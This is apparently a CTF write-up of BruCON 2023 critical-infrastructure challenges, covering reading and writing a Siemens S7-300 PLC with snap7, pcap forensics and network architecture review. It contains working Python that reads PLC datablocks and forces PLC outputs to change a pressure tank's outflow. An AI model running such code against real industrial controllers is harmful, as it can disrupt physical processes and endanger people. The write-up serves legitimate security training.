---
layout: post
title: "BruCON 2023 CTF Critical Infrastructure Challenges"
author: cryptax
date: 2023-09-29
tags:
- Brucon
- CTF
- 2023
- ICS
- PLC
- S7
---
This is a write-up for some of the PLC / Critical Infrastructure challenges of BruCON.

## PLC: The Secret Ingredient

This is an OT challenge where we interact with a real PLC. We are asked to "get the PLC program and rescue the company secret located in datablock 23". The IP address of the PLC is `35.232.66.239:102`.

I solved this one with a team mate, and he did the most difficult part. This challenge was only worth 50 points in the end, I think it should have earned us more.

The PLC is a S7-300:

```
 nmap -Pn -sT -p102 --script s7-info 35.232.66.239
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-28 17:26 CEST
Nmap scan report for 239.66.232.35.bc.googleusercontent.com (35.232.66.239)
Host is up (0.11s latency).

PORT    STATE SERVICE
102/tcp open  iso-tsap
| s7-info: 
|   Module: 6ES7 314-6EH04-0AB0 
|   Basic Hardware: 6ES7 314-6EH04-0AB0 
|   Version: 3.3.10
|   System Name: S7-300 station_2
|   Module Type: Hard
|   Serial Number: S Q-E1U078232014
|_  Copyright: Original Siemens Equipment
Service Info: Device: specialized
```

On the web, I found several exploits from Beresford, 2011 which basically consisted in commanding several START and STOP of the PLC, and another one to dump the PLC's memory. I tried those scripts on metasploit but they wouldn't work (implementation error - probably no longer compatible with recent languages).

My team mate found a Python library, snap7, to discuss with the PLC.
The rack and slot depend on the PLC's model (here for a S7-300). The datablock number was provided in the description.

```python
import snap7
from snap7.util import *

plc_ip = "35.232.66.239"  # Replace with your PLC's IP address
rack = 0
slot = 2

plc = snap7.client.Client()
plc.connect(plc_ip, rack, slot)

db_number = 23 # Datablock number
start_byte = 0  
data_length = 100

# Read data from the data block
data = plc.read_area(snap7.types.Areas.DB, db_number, start_byte, data_length)

# Close the PLC connection
plc.disconnect()

# Display the data
print("Data read from PLC:")
print(data)
```

When we run this program, we get the following answer:

```
Data read from PLC:
bytearray(b'pp\x01\x01\x05\n\x00\x17\x00\x00\x00\x8e\x00\x00\x00\x00\x03J\x12\xa570\x03C*q70\x00\x1e\x00\x00\x00\x00\x00(CRIMINAL_HOPS\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x17\x00\x17\x00\x00\x00\x11\x04\n\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04\x06\x04')
```

The description was asking for a *UUID* as flag, but that was an error. I could have searched for a long time, fortunately I tried *"CRIMINAL_HOPS"* by pure luck and that was the flag. The organizers explained that in other CTFs they were asking for the UUID and that this was an error.

## PLC: Rerouting the brew

In this second PLC challenge, we are now asked: *"Manipulate the outlow of the pressure tank by setting the PLC outputs 2,4 and 6. Verify the changes by verifying the datablock 42."*.

Same the solution below is mostly the work of a team mate.

```python
import snap7
import snap7.client as c
from snap7.util import *
from time import sleep

plc_ip = "34.123.131.215"  # Replace with your PLC's IP address
rack = 0  # Rack number (usually 0 for S7-300)
slot = 2  # Slot number (usually 2 for S7-300)


def WriteOutput(dev, bytebit, cmd):
    if bytebit in ['2.0', '4.0', '6.0']:
        byte, bit = bytebit.split('.')
        byte, bit = int(byte), int(bit)
        data = dev.read_area(snap7.types.Areas.PA, 0, byte, 1) # S7AreaPA
        set_bool(data, byte, bit, cmd)
        dev.write_area(0x82, byte, data)

def main():
    myplc = snap7.client.Client()
    myplc.connect(plc_ip, rack, slot)
    for x in range(10):
        WriteOutput(myplc, '2.0', True)  # Set output 2 to true
        WriteOutput(myplc, '4.0', True)  # Set output 4 to true
        WriteOutput(myplc, '6.0', True)  # Set output 6 to true
        sleep(1)
        
    # Read
    db_number = 42 # Datablock number
    start_byte = 0  
    data_length = 100
    # Read data from the data block
    data = plc.read_area(snap7.types.Areas.DB, db_number, start_byte, data_length)
    plc.disconnect()
    
    print("Data read from PLC:")
    print(" ".join(f"{byte:02X}" for byte in data))
    print(data)

if __name__ == "__main__":
    main()
```

# CTI

Those were several challenges on Critical Infrastructure. For all of them, we had a common pcap and smbp file

## CTI: Find the PDF

This challenge asked *"Find the PDF document file name within the network packet capture"*. 

We didn't even need to load the Pcap in Wireshark. Mere strings on the pcap and grepping on pdf revealed the name of the PDF. The flag was the name of the PDF.

```
$ strings Incident1.1.1.pcap | grep pdf
STOR Architecture Dossier-BruCON Brewery V2.0.pdf
MDTM 20230901120136 Architecture Dossier-BruCON Brewery V2.0.pdf
...
```

## CTI: Which subnet

*"Which subnet from the enterprise domain network exfiltrates the PDF document?"*

![](/images/brucon2023-ftp.png)

IP address 192.168.124.128 is getting the PDF via FTP. The FTP server is 192.168.170.215. We struggled a long time on this one, because we thought we had to supply `192.168.0.0/16` as answer, and it did not work.

In the end, I asked an organizer who made me understand he wasn't expecting a *technical representation* of the subnet but it's name in the network architecture diagram. This diagram was supplied in a PDF for the CTI Architecture challenges.

![](/images/brucon2023-marketing.png)

We see the PDF is exfiltrated from a workstation in the Marketing subnet. *Marketing* was the flag.

## CTI: Devices

*"How many devices did communicate with the PLC"*

Devices who communicate with a PLC use the ModBus protocol. We can filter such packets in Wireshark with the filter "mdtcp" (or we could have filtered communications to the PLC's IP address).

In ModBus we have communications between 192.168.174.242 and

- 192.168.170.240 (SCADA)
- 192.168.174.99 (PLC)
- 192.168.174.245 (PLC)

To be honest, when I flagged I hadn't understood this at all, and tried 1, then 2 and happily got the flag with answer `3`...

## CTI: Mac Addy

*"What is the MAC address of the PLC?"*

I solved this one by looking at the file `GRC_known_good.smbp` first. It's an XML file and we see this IP address:
```
          <IpAddress>192.168.174.242</IpAddress>
          <GatewayAddress>192.168.174.1</GatewayAddress>
```
So, then I looked for `192.168.174.242` in Wireshark and found its MAC address: `00:80:f4:0e:8d:13`. This was the flag.

# CTI Architecture

For those challenges, we were given a 9-page PDF titled "BruCON Brewery Architecture Dossier". [PDF](/source/CTF_Architecture_Dossier-BruCON_Brewery_V2.0.pdf).

The point of all challenges in this section was to read this PDF and comment it on a security point of view. The issue is that the expected answers weren't technical ones like "an attacker can send a phishing email to crab the credentials of an employee" but high level concepts.

The first question consisted in commenting what was mainly missing in the network diagram. Basically, the issue was that there was no firewall to secure the traffic inside the company between subnets. The expected answer was something like "micro segmentation", "IEC64443" and "Purdue Model".

There was a question on flaws of the logging system. The first issue I saw was that it would be possible to erase logs. The solution they expected was how to solve it, such as duplicating the logs, if possible in another branch of the company physically located elsewhere.

There were also questions about remote access of employees and issues with how it was designed. A first flag came by saying that whitelisting IP addresses was insufficient to guarantee the connection came from an employee and that 2FA could be a solution to partly remedy the issue. Another flag came by arguing that there was no VPN from the employee's location to the enterprise. Discussed about the fact that employees were actually not authentified and that the enterprise has no real idea who they were, just that they were authorized or not, and that the inner RBAC strategy should have been deployed also externally.

While those challenges were interesting, I regret that the solution was too much to talk your way out to get the flag. I would have preferred a very strictly formatted flag based on more precise questions. But overall, the idea of studying the PDF was excellent.



